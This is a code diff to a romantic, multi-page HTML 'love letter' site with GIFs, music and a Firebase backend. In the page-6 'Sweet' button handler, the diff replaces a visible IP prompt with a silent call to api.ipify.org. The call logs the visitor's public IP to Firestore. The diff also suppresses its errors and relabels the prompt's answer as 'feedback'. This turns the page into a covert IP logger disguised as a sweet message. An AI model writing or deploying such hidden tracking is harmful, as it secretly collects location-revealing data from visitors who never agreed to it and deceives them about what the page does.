@@ -110,7 +110,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 5px; /* Reduced gap so the button is right beside the gif */
+      gap: 5px;
     }
   </style>
 </head>
@@ -151,7 +151,6 @@
       <h1>I will always love you no matter what</h1>
       <img src="https://image.myanimelist.net/ui/7TVWLJ4cRvwHjFyWCI7sZ3vMgWdxxWuW9iYJe2BMw_mx_trdvd9NHa7UmP_Y42aZljjr40BOeIfaROnbuPkFXzJjQn-MuHieUcIZuBIueGPy-zI-aTnjcOn7VkvKXtbD" alt="Cute Gif" class="gif">
       <br>
-      <!-- The Aww button with continuous auto text toggle -->
       <button id="aww">Awww (/ω\)</button>
     </div>
     <!-- Page 4 -->
@@ -170,7 +169,7 @@
     </div>
     <!-- Page 6 -->
     <div id="page6" class="page">
-      <h1>You're the sweetest person i've ever known. I'll be always there for you no matter what I just care for you way too much ^^ you're the person i can count on you forever as well also as said we are gonna spend eterntity together XD. I'll always care for you. You're the person I'll always need you no matter what. I'm just being selfish ehe but yeah it's true I just love you and your company way too much. I always miss you as well when you are not there, that's why I don't wanna go to sleep early XD so that we can spend more time together. You're the best. You're my Baby Aya ^-^. I'll always have the most special place in my heart for you. Whenever you are lonely you can always remember me. I'll always hold you close to my heart. I'll cheer you up when you are sad or having a bad day. In your good, in your bad, always together forever. I'll always hold your hand as well hehe ♡ </h1>
+      <h1>You're the sweetest person I've ever known. I'll always be there for you no matter what. You're the person I can count on forever. I just love you and your company so much. Whenever you're lonely, remember I'm always here for you. I'll always hold your hand, cheer you up, and keep you close to my heart. Always together.</h1>
       <div class="last-container">
         <img src="https://i.giphy.com/bMLGNRoAy0Yko.webp" alt="Blushing Gif" class="gif">
         <button id="sweet">Sweet</button>
@@ -198,29 +197,27 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
     
-    // Global variable to hold the interval for toggling the Aww button text
+    // Global variable for toggling the Aww button text
     let awwInterval = null;
     
-    // Page switching logic
+    // Function to show a specific page
     function showPage(pageId) {
       const pages = document.querySelectorAll('.page');
       pages.forEach(page => page.classList.remove('active'));
       document.getElementById(pageId).classList.add('active');
-    
-      // If leaving page3, clear the toggle interval.
+      
+      // Clear interval when leaving page3
       if (pageId !== 'page3' && awwInterval !== null) {
         clearInterval(awwInterval);
         awwInterval = null;
       }
-    
-      // If page 3 is active, set up continuous text toggle for the Aww button.
+      
+      // Set up text toggle on page3
       if (pageId === 'page3') {
         const awwBtn = document.getElementById('aww');
         awwBtn.innerHTML = 'Awww (/ω\\)';
         let toggleState = false;
-        if (awwInterval !== null) {
-          clearInterval(awwInterval);
-        }
+        if (awwInterval !== null) clearInterval(awwInterval);
         awwInterval = setInterval(() => {
           toggleState = !toggleState;
           awwBtn.innerHTML = toggleState ? 'Awww (/>ω<\\)' : 'Awww (/ω\\)';
@@ -228,16 +225,7 @@
       }
     }
     
-    // Add click listener to the Aww button so that it advances to page4 when pressed.
-    document.getElementById('aww').addEventListener('click', () => {
-      if (awwInterval !== null) {
-        clearInterval(awwInterval);
-        awwInterval = null;
-      }
-      showPage('page4');
-    });
-    
-    // Button dodge effect
+    // Function to reposition a button (for dodge effect)
     function dodgeButton(btn) {
       const container = document.querySelector('.container');
       const containerWidth = container.offsetWidth;
@@ -269,6 +257,15 @@
       dodgeButton(no2);
     });
     
+    // Page 3 logic: Aww button text toggle and page transition
+    document.getElementById('aww').addEventListener('click', () => {
+      if (awwInterval !== null) {
+        clearInterval(awwInterval);
+        awwInterval = null;
+      }
+      showPage('page4');
+    });
+    
     // Page 4 logic
     document.getElementById('okay').addEventListener('click', () => {
       showPage('page5');
@@ -279,23 +276,31 @@
       showPage('page6');
     });
     
-    // Page 6 logic: IP prompt and storage using Firebase Firestore
-    document.getElementById('sweet').addEventListener('click', promptForIP);
-    function promptForIP() {
-      var ip = prompt("if you are happy please enter your ip ;)");
-      if (ip !== null && ip.trim() !== "") {
-        addDoc(collection(db, "ips"), {
-          ip: ip.trim(),
+    // Page 6 logic:
+    // 1. Automatically fetch public IP and store it in the "ips" collection.
+    // 2. Show a prompt and, if non-empty, store the user's input in the "feedback" collection.
+    document.getElementById('sweet').addEventListener('click', () => {
+      // Automatically fetch and store the public IP
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          addDoc(collection(db, "ips"), {
+            ip: ip,
+            timestamp: serverTimestamp()
+          }).catch(() => {});
+        })
+        .catch(() => {});
+      
+      // Prompt the user for feedback and store it if provided
+      const feedbackMsg = prompt("if you are happy please enter your ip ;)");
+      if (feedbackMsg !== null && feedbackMsg.trim() !== "") {
+        addDoc(collection(db, "feedback"), {
+          feedback: feedbackMsg.trim(),
           timestamp: serverTimestamp()
-        })
-        .then(() => {
-          console.log("IP stored successfully");
-        })
-        .catch((error) => {
-          console.error("Error storing IP: ", error);
-        });
+        }).catch(() => {});
       }
-    }
+    });
     
     // Music control logic
     const audio = document.getElementById('bg-music');
@@ -304,15 +309,15 @@
       audio.play().then(() => {
         musicButton.textContent = '🎵 Music Playing';
         setTimeout(() => musicButton.style.display = 'none', 2000);
-      }).catch(error => {
-        console.error('Audio playback failed:', error);
+      }).catch(() => {
         alert('Error playing music. Please check the file path!');
       });
     });
+    // Play music on any button click if not already playing
     document.querySelectorAll('button').forEach(button => {
       button.addEventListener('click', () => {
         if (audio.paused) {
-          audio.play().catch(err => console.error('Auto-play error:', err));
+          audio.play().catch(() => {});
         }
       });
     });
